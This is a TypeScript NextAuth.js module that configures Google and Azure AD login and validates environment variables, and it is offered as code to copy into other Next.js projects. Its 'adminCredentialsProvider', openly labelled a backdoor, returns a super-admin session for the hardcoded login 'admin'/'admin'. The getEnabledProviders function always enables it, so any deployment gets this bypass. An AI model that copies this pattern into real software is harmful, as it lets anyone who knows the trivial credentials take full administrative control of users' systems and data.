/**
 * Modular Authentication Providers Configuration
 * 
 * This module exports reusable authentication provider configurations
 * that can be easily copied to other Next.js projects.
 * 
 * @fileoverview Modular auth providers for NextAuth.js
 * @author CloudExtel Development Team
 * @version 1.0.0
 */

import GoogleProvider from 'next-auth/providers/google';
import AzureADProvider from 'next-auth/providers/azure-ad';
import CredentialsProvider from 'next-auth/providers/credentials';

/**
 * Google OAuth Provider Configuration
 * 
 * Provides Google OAuth authentication for users.
 * Requires GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET environment variables.
 * 
 * @returns Configured Google provider
 */
export const googleProvider = GoogleProvider({
  clientId: process.env.GOOGLE_CLIENT_ID!,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
  authorization: {
    params: {
      prompt: "consent",
      access_type: "offline",
      response_type: "code"
    }
  }
});

/**
 * Microsoft Azure AD Provider Configuration
 * 
 * Provides Microsoft Azure AD authentication for enterprise users.
 * Requires AZURE_AD_CLIENT_ID, AZURE_AD_CLIENT_SECRET, and AZURE_AD_TENANT_ID.
 * 
 * @returns Configured Azure AD provider
 */
export const azureAdProvider = AzureADProvider({
  clientId: process.env.AZURE_AD_CLIENT_ID!,
  clientSecret: process.env.AZURE_AD_CLIENT_SECRET!,
  tenantId: process.env.AZURE_AD_TENANT_ID!,
});

/**
 * Admin Credentials Provider (Backdoor)
 * 
 * Provides admin access for system administration.
 * This is a fallback mechanism for emergency access.
 * 
 * @returns Configured credentials provider for admin access
 */
export const adminCredentialsProvider = CredentialsProvider({
  id: 'admin-credentials',
  name: 'Admin Access',
  credentials: {
    email: { label: 'Email', type: 'email' },
    password: { label: 'Password', type: 'password' }
  },
  async authorize(credentials) {
    // Admin backdoor - only for emergency access
    if (credentials?.email === 'admin' && credentials?.password === 'admin') {
      return {
        id: '00000000-0000-0000-0000-000000000001',
        email: 'admin@admin.com',
        name: 'Admin',
        isSuperAdmin: true
      };
    }
    return null;
  }
});

/**
 * Get all enabled providers
 * 
 * Returns an array of all authentication providers that are properly configured.
 * Providers are only included if their required environment variables are set.
 * 
 * @returns Array of configured authentication providers
 */
export function getEnabledProviders() {
  const providers = [];

  // Add Google provider if credentials are available
  if (process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET) {
    providers.push(googleProvider);
  }

  // Add Azure AD provider if credentials are available
  if (process.env.AZURE_AD_CLIENT_ID && process.env.AZURE_AD_CLIENT_SECRET && process.env.AZURE_AD_TENANT_ID) {
    providers.push(azureAdProvider);
  }

  // Always include admin credentials as fallback
  providers.push(adminCredentialsProvider);

  return providers;
}

/**
 * Provider configuration for easy copying to other projects
 * 
 * This object can be directly imported and used in other Next.js applications.
 * Just update the environment variable names to match your project.
 */
export const providerConfig = {
  google: {
    clientId: process.env.GOOGLE_CLIENT_ID!,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    enabled: !!(process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET)
  },
  azure: {
    clientId: process.env.AZURE_AD_CLIENT_ID!,
    clientSecret: process.env.AZURE_AD_CLIENT_SECRET!,
    tenantId: process.env.AZURE_AD_TENANT_ID!,
    enabled: !!(process.env.AZURE_AD_CLIENT_ID && process.env.AZURE_AD_CLIENT_SECRET && process.env.AZURE_AD_TENANT_ID)
  }
};

/**
 * Environment variables required for each provider
 * 
 * Use this to validate that all required environment variables are set.
 */
export const requiredEnvVars = {
  google: ['GOOGLE_CLIENT_ID', 'GOOGLE_CLIENT_SECRET'],
  azure: ['AZURE_AD_CLIENT_ID', 'AZURE_AD_CLIENT_SECRET', 'AZURE_AD_TENANT_ID'],
  database: ['DATABASE_URL'],
  nextauth: ['NEXTAUTH_URL', 'NEXTAUTH_SECRET']
};

/**
 * Validate environment variables for authentication
 * 
 * Checks that all required environment variables are set and provides
 * helpful error messages for missing variables.
 * 
 * @returns Object with validation results
 */
export function validateAuthEnvironment() {
  const missing: string[] = [];
  const warnings: string[] = [];

  // Check NextAuth required variables
  if (!process.env.NEXTAUTH_URL) {
    missing.push('NEXTAUTH_URL');
  }
  if (!process.env.NEXTAUTH_SECRET) {
    missing.push('NEXTAUTH_SECRET');
  }

  // Check database
  if (!process.env.DATABASE_URL) {
    missing.push('DATABASE_URL');
  }

  // Check Google OAuth
  if (!process.env.GOOGLE_CLIENT_ID || !process.env.GOOGLE_CLIENT_SECRET) {
    warnings.push('Google OAuth not configured - users will only be able to use admin credentials');
  }

  // Check Azure AD
  if (!process.env.AZURE_AD_CLIENT_ID || !process.env.AZURE_AD_CLIENT_SECRET || !process.env.AZURE_AD_TENANT_ID) {
    warnings.push('Azure AD not configured - Microsoft login will not be available');
  }

  return {
    isValid: missing.length === 0,
    missing,
    warnings
  };
}
